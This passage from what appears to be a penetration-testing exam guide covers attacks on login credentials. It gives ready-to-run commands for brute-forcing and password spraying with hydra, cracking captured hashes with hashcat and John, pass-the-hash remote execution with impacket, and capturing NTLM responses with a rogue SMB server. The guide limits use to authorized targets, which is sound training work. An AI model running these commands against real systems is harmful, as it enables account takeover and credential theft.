strong password. <h2

title: 9.4.3.3 Validate one known password
text: id="validate-one-known-password">9.4.3.3 Validate one known password Use the normal client for the observed service: ssh -o PreferredAuthentications=password -p PORT USER@TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore Local Windows account: nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares Decisive output: the destination service accepts the intended identity. Share, session or action access is a separate authorization result. <summary

title: 9.4.3.3.1 Variant — known user, targeted password dictionary
text: id="variant-9-4-3-3-1">9.4.3.3.1 Variant — known user, targeted password dictionary hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client. <summary

title: 9.4.3.3.2 Variant — one password across an authorized user list
text: id="variant-9-4-3-3-2">9.4.3.3.2 Variant — one password across an authorized user list hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first. <summary

title: 9.4.3.3.3 Variant — HTTP POST form
text: id="variant-9-4-3-3-3">9.4.3.3.3 Variant — HTTP POST form Capture a correct request and stable failure marker with Burp: hydra -l USER -P WORDLIST TARGET http-post-form \ '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT' Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives. <summary

title: 9.4.3.3.4 RunasCs — test a known password from an existing Windows shell
text: id="variant-9-4-3-3-4">9.4.3.3.4 RunasCs — test a known password from an existing Windows shell Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password. <h3

title: 9.4.3.3.5 Domain account: verify the new process token
text: id="variant-9-4-3-3-5">9.4.3.3.5 Domain account: verify the new process token REM Domain account: verify the new process token RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN <h3

title: 9.4.3.3.6 Local account: omit the domain switch for the current host's account
text: id="variant-9-4-3-3-6">9.4.3.3.6 Local account: omit the domain switch for the current host's account REM Local account: omit the domain switch for the current host's account RunasCs.exe USER PASSWORD "cmd /c whoami /all" <h3

title: 9.4.3.3.7 Network-only credentials: local identity stays unchanged
text: id="variant-9-4-3-3-7">9.4.3.3.7 Network-only credentials: local identity stays unchanged REM Network-only credentials: local identity stays unchanged RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9 Read: in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource. RunasCs upstream . Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token. <h2

title: 9.4.3.4 Estimate feasibility
text: id="estimate-feasibility">9.4.3.4 Estimate feasibility hashcat -b -m MODE python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)" Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order: exact recovered/default candidates -> organization/user/product words -> observed policy and mutations -> small dictionary plus rules -> known mask/hybrid -> broader curated lists/rules -> exhaustive search only when its measured cost is defensible Preview mutations before spending the candidate budget: hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50 john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50 <h2

title: 9.4.3.5 Hashcat baseline and meaningful modes
text: id="hashcat-baseline-and-meaningful-modes">9.4.3.5 Hashcat baseline and meaningful modes hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m MODE hashes.txt --show -a 0 is dictionary mode. Do not use -a 3 with a wordlist; attack mode 3 expects a mask. Common source examples identify NTLM as mode 1000 , Net-NTLMv2 as 5600 and KeePass as 13400 , but confirm against the installed version: hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH' <summary

title: 9.4.3.5.1 Mask and session variants
text: id="variant-9-4-3-5-1">9.4.3.5.1 Mask and session variants hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask hashcat --session targeted-mask --restore Mask order is a hypothesis about structure. Estimate its keyspace before committing time. <summary

title: 9.4.3.5.2 Hybrid variant — base word plus three digits
text: id="variant-9-4-3-5-2">9.4.3.5.2 Hybrid variant — base word plus three digits hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid Use only when evidence supports both the base words and suffix shape. <h2

title: 9.4.3.6 John the Ripper workflow
text: id="john-the-ripper-workflow">9.4.3.6 John the Ripper workflow john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt john --session=crack-job --wordlist=wordlist.txt hash.txt john --restore=crack-job File-to-hash converters: zip2john archive.zip > archive.hash 7z2john archive.7z > archive.hash ssh2john id_rsa > ssh.hash keepass2john vault.kdbx > keepass.hash pdf2john document.pdf > pdf.hash office2john document.docx > office.hash rar2john archive.rar > rar.hash unshadow passwd.copy shadow.copy > linux.hash Converter availability varies by package/path; locate it rather than assuming: command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null Preserve the complete converter output. Some formats include a filename label before : that John accepts but Hashcat may require removed from a separate tool-specific copy. <h2

title: 9.4.3.7 KeePass database
text: id="keepass-database">9.4.3.7 KeePass database keepass2john vault.kdbx > keepass.hash john --wordlist=wordlist.txt keepass.hash john --show keepass.hash Hashcat alternative after confirming KDBX/KDF and input format: hashcat -hh | grep -i keepass hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 13400 keepass.hash --show Mode 13400 covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault. <h2

title: 9.4.3.8 SSH private-key passphrase
text: id="ssh-private-key-passphrase">9.4.3.8 SSH private-key passphrase ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt ssh.hash john --show ssh.hash chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. Permission denied (publickey) can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock. <summary

title: 9.4.3.8.1 Hashcat variant — only for a supported OpenSSH format
text: id="variant-9-4-3-8-1">9.4.3.8.1 Hashcat variant — only for a supported OpenSSH format hashcat -hh | grep -i 'OpenSSH\|Private Key' hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE Choose MODE from the complete $sshng$... structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not --force with a wrong mode. <h2

title: 9.4.3.9 Linux password records
text: id="linux-password-records">9.4.3.9 Linux password records unshadow passwd.copy shadow.copy > linux.hash john --wordlist=wordlist.txt --rules=Jumbo linux.hash john --show linux.hash Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, su policy or a disabled account. <h2

title: 9.4.3.10 NT hash
text: id="nt-hash">9.4.3.10 NT hash Offline recovery: hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule john --format=NT --wordlist=wordlist.txt nt.hash Compatible SMB validation: nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material. <summary

title: 9.4.3.10.1 Variant — remote access/execution when the identity has matching rights
text: id="variant-9-4-3-10-1">9.4.3.10.1 Variant — remote access/execution when the identity has matching rights impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure. <h2

title: 9.4.3.11 Net-NTLMv2 response
text: id="net-ntlmv2-response">9.4.3.11 Net-NTLMv2 response hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash A Net-NTLMv2 response is not an NT hash and cannot be supplied to -H or -hashes . Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights. The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide. <h2

title: 9.4.3.12 DCC2 / cached domain logon
text: id="dcc2--cached-domain-logon">9.4.3.12 DCC2 / cached domain logon hashcat -hh | grep -i 'Domain Cached' john --format=mscash2 --wordlist=wordlist.txt dcc2.hash Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material. <h2

title: 9.4.3.13 Kerberos tickets and caches
text: id="kerberos-tickets-and-caches">9.4.3.13 Kerberos tickets and caches Inspect before use: klist KRB5CCNAME=TICKET.ccache klist impacket-ticketConverter TICKET.kirbi TICKET.ccache Compatible client example: export KRB5CCNAME=TICKET.ccache impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN' Verify client principal, realm, TGT versus service ticket , SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures. <h2

title: 9.4.3.14 Credential Guard boundary
text: id="credential-guard-boundary">9.4.3.14 Credential Guard boundary Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response. <h2

title: 9.4.3.15 Failure routing
text: id="failure-routing">9.4.3.15 Failure routing Failure Interpretation / next action Timeout/no route Fix source position, pivot or service reachability before judging the credential Wrong TLS/protocol response Reconfirm application and required transport Local/domain/UPN mismatch Retry only an evidence-backed identity form Account disabled/locked/expired/restricted Stop guessing; preserve possible credential validity and record state Password/public-key/NTLM/Kerberos method rejected Choose material/client compatible with server policy Authentication succeeds, requested action fails Credential is valid; enumerate authorization and another relevant service Hash parser rejects input Recheck complete line, prefix, converter, mode and version Key unlocks but SSH rejects it Recheck user, server, authorized-key state and algorithm policy Ticket loads but service rejects it Check expiry, SPN, realm, clock, DNS and service authorization PtH login succeeds but execution fails Check admin rights, UAC remote restrictions and method-specific ports/rights <h2

title: 9.4.3.16 Re-enumerate after success
text: id="re-enumerate-after-success">9.4.3.16 Re-enumerate after success accepted identity -> groups/roles -> reachable services -> shares/files -> authenticated application behavior -> accessible hosts/routes -> new credentials/tickets/sessions -> privilege and movement handoffs Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping. <h2

title: 9.4.3.17 Build a small site-specific wordlist with CeWL
text: id="build-a-small-site-specific-wordlist-with-cewl">9.4.3.17 Build a small site-specific wordlist with CeWL Use when observed organization, product or account vocabulary could improve an offline recovery attempt. Keep the crawl on the assigned site. <h3

title: 9.4.3.17.1 Bounded crawl: depth 1, words of at least five characters
text: id="variant-9-4-3-17-1">9.4.3.17.1 Bounded crawl: depth 1, words of at least five characters # Bounded crawl: depth 1, words of at least five characters cewl -d 1 -m 5 --lowercase -w site-words.txt http://TARGET:PORT/ <h3

title: 9.4.3.17.2 Review before using it in the existing format-specific recovery command
text: id="variant-9-4-3-17-2">9.4.3.17.2 Review before using it in the existing format-specific recovery command # Review before using it in the existing format-specific recovery command head -n 30 site-words.txt wc -l site-words.txt Read: useful vocabulary is a candidate list, not a recovered password. An authenticated or JS-only page may expose little to the crawler. Use the already identified Hashcat/John format, then apply a small relevant rule/mask rather than immediately creating an enormous list. Sources: upstream 1 . <h2

title: 9.4.3.18 Generate usernames from observed naming conventions
text: id="generate-usernames-from-observed-naming-conventions">9.4.3.18 Generate usernames from observed naming conventions Use when you have names and at least one real account/email that reveals a likely format. Put only relevant names in names.txt. <h3

title: 9.4.3.18.1 Review supported format names in this installed version
text: id="variant-9-4-3-18-1">9.4.3.18.1 Review supported format names in this installed version # Review supported format names in this installed version ./username-anarchy --list-formats <h3

title: 9.4.3.18.2 Restrict output to plausible formats rather than every permutation
text: id="variant-9-4-3-18-2">9.4.3.18.2 Restrict output to plausible formats rather than every permutation # Restrict output to plausible formats rather than every permutation ./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt sort -u users.txt -o users.txt Read: these are candidates. Confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. Keep domain, local-machine and application namespaces distinct. Use Kerbrute's username probe only when the KDC path and domain are known. Sources: upstream 1 . <h2

title: 9.4.3.19 Targeted candidates — Crunch, CUPP and rules
text: id="targeted-candidates--crunch-cupp-and-rules">9.4.3.19 Targeted candidates — Crunch, CUPP and rules Use a mask/profile only when evidence justifies it. This example expands a known six-character stem with three digits; it creates 1,000 candidates. <h3

title: 9.4.3.19.1 crunch 9 9 -t 'foobar%%%' -o stem-digits.txt
text: id="variant-9-4-3-19-1">9.4.3.19.1 crunch 9 9 -t 'foobar%%%' -o stem-digits.txt crunch 9 9 -t 'foobar%%%' -o stem-digits.txt <h3

title: 9.4.3.19.2 Interactive profile-based alternative, when relevant clues exist
text: id="variant-9-4-3-19-2">9.4.3.19.2 Interactive profile-based alternative, when relevant clues exist # Interactive profile-based alternative, when relevant clues exist python3 cupp.py -i <h3

title: 9.4.3.19.3 Preview a rule expansion before choosing the recovery job
text: id="variant-9-4-3-19-3">9.4.3.19.3 Preview a rule expansion before choosing the recovery job # Preview a rule expansion before choosing the recovery job hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40 Read: calculate candidate count and use the matching offline format. CUPP asks questions; invented personal details do not improve the list. A three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login. Sources: upstream 1 · upstream 2 · upstream 3 . <h2

title: 9.4.3.20 Password-protected ZIP — direct test or extracted verifier
text: id="password-protected-zip--direct-test-or-extracted-verifier">9.4.3.20 Password-protected ZIP — direct test or extracted verifier Use when the artifact is an encrypted ZIP and its encryption is supported by the selected tool. <h3

title: 9.4.3.20.1 Dictionary attack; -u checks candidates by attempting extraction
text: id="variant-9-4-3-20-1">9.4.3.20.1 Dictionary attack; -u checks candidates by attempting extraction # Dictionary attack; -u checks candidates by attempting extraction fcrackzip -u -D -p WORDLIST archive.zip <h3

title: 9.4.3.20.2 Alternative: extract a verifier for John, preserving the original archive
text: id="variant-9-4-3-20-2">9.4.3.20.2 Alternative: extract a verifier for John, preserving the original archive # Alternative: extract a verifier for John, preserving the original archive zip2john archive.zip > archive.hash john --wordlist=WORDLIST archive.hash john --show archive.hash Read: confirm a candidate by opening/extracting the intended file. An unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. Reuse the recovered value only after identifying its account/service context. Sources: upstream 1 · upstream 2 . <h2

title: 9.4.3.21 HTTP Basic authentication — validate the challenge and failure signal
text: id="http-basic-authentication--validate-the-challenge-and-failure-signal">9.4.3.21 HTTP Basic authentication — validate the challenge and failure signal Use when the endpoint returns a real HTTP Basic challenge. A custom HTML login form is a different mechanism. <h3

title: 9.4.3.21.1 curl -i http://TARGET:PORT/PROTECTED_PATH
text: id="variant-9-4-3-21-1">9.4.3.21.1 curl -i http://TARGET:PORT/PROTECTED_PATH curl -i http://TARGET:PORT/PROTECTED_PATH curl -i --basic -u USER http://TARGET:PORT/PROTECTED_PATH <h3

title: 9.4.3.21.2 Only when bounded online guessing is justified by scope and lockout controls
text: id="variant-9-4-3-21-2">9.4.3.21.2 Only when bounded online guessing is justified by scope and lockout controls # Only when bounded online guessing is justified by scope and lockout controls hydra -l USER -P WORDLIST -s PORT -t 1 -f TARGET http-get /PROTECTED_PATH Read: distinguish an accepted HTTP identity from permission to the protected function. Confirm a reported success with curl/browser. Redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses. Sources: upstream 1 · upstream 2 . <h2

title: 9.4.3.22 Change an account’s own expired/known SMB password
text: id="change-an-accounts-own-expiredknown-smb-password">9.4.3.22 Change an account’s own expired/known SMB password Use when you know the old password and the account is allowed or required to change it. This is not an administrative reset of another account. # Prompts for the old and new password on the specified server/DC smbpasswd -r DC_HOST -U 'DOMAIN/USER' Read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. Failure → check account scope, password policy, connectivity and change-password rights. Test the new password with the relevant native service client before moving on. Sources: upstream 1 . <h2

title: 9.4.3.23 Generate a bounded numeric list for an observed identifier pattern
text: id="generate-a-bounded-numeric-list-for-an-observed-identifier-pattern">9.4.3.23 Generate a bounded numeric list for an observed identifier pattern Use when actual examples indicate a small numeric ID/range. Keep generated input separate from the decision to send online requests. <h3

title: 9.4.3.23.1 Unpadded IDs
text: id="variant-9-4-3-23-1">9.4.3.23.1 Unpadded IDs # Unpadded IDs seq 0 999 > numbers.txt <h3

title: 9.4.3.23.2 Fixed-width values, only when the observed application uses that format
text: id="variant-9-4-3-23-2">9.4.3.23.2 Fixed-width values, only when the observed application uses that format # Fixed-width values, only when the observed application uses that format seq -w 0 999 > numbers-padded.txt Read: a matching format is a candidate input list, not permission to enumerate every object. Use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. Expand the range only when returned evidence justifies it. Sources: upstream 1 . <h2

title: 9.4.3.24 An application authenticates to your explicit SMB endpoint
text: id="an-application-authenticates-to-your-explicit-smb-endpoint">9.4.3.24 An application authenticates to your explicit SMB endpoint Use only when an observed application/file-request primitive can contact an explicitly supplied SMB path and the network/account policy permits NTLM. This workflow does not poison names or spoof network identities. <h3

title: 9.4.3.24.1 Attacker: serve the intended directory and keep the authentication log
text: id="variant-9-4-3-24-1">9.4.3.24.1 Attacker: serve the intended directory and keep the authentication log # Attacker: serve the intended directory and keep the authentication log mkdir -p share sudo impacket-smbserver SHARE ./share -smb2support 2>&1 | tee smb-server.log <h3

title: 9.4.3.24.2 A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash
text: id="variant-9-4-3-24-2">9.4.3.24.2 A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash # A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash hashcat -m 5600 netntlmv2.txt WORDLIST hashcat -m 5600 netntlmv2.txt --show Supply the actual application with the intended \\LHOST\SHARE\FILE path only through the already verified input mechanism. Read: retain the entire challenge-response line and the reported account/domain. No callback can be routing, SMB egress or NTLM policy; a callback without recoverable credentials is not a password. Validate a recovered plaintext password in the matching identity. Do not substitute this response for the NT hash expected by pass-the-hash tools. Sources: upstream 1 · upstream 2 . <h2
